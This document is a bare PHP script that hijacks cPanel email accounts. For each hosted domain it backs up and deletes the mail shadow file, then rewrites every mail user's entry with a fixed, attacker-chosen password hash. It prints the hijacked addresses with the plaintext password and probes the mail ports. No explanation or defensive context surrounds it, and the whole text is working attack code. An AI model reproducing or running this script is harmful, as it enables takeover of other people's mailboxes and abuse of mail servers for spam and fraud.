<?php
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);

// Port to scan
$ports = array(25, 587, 465, 110, 995, 143, 993);
$primary_port = '25';

// Current user
$user = get_current_user();

// SMTP password
$password = 'nb34m5bf';

// Crypt
$pwd = crypt($password, '$6$nb34m5bf$');

// Host name
$t = $_SERVER['SERVER_NAME'];
$t = @str_replace("www.", "", $t);

$dirs = glob('/home/' . $user . '/etc/*', GLOB_ONLYDIR);

foreach ($dirs as $dir) {
    $ex = explode("/", $dir);
    $site = $ex[count($ex) - 1];

    // Get users
    @$passwd = file_get_contents('/home/' . $user . '/etc/' . $site . '/shadow');
    $ex = explode("\r\n", $passwd);

    // Backup shadow
    @link('/home/' . $user . '/etc/' . $site . '/shadow', '/home/' . $user . '/etc/' . $site . '/shadow.nb34m5bf.bak');

    // Delete shadow
    @unlink('/home/' . $user . '/etc/' . $site . '/shadow');

    foreach ($ex as $entry) {
        $entry = explode(':', $entry);
        $email_user = $entry[0];

        if ($email_user) {
            $b = fopen('/home/' . $user . '/etc/' . $site . '/shadow', 'ab');
            fwrite($b, $email_user . ':' . $pwd . ':16249:::::' . "\r\n");
            fclose($b);

            // Output in plain text format
            echo $site . '|' . $primary_port . '|' . $email_user . '@' . $site . '|' . $password . "\n";
        }
    }

    // Port scan
    foreach ($ports as $port) {
        $connection = @fsockopen($site, $port, $errno, $errstr, 2);
        if (is_resource($connection)) {
            fclose($connection);
        }
    }
}
?>
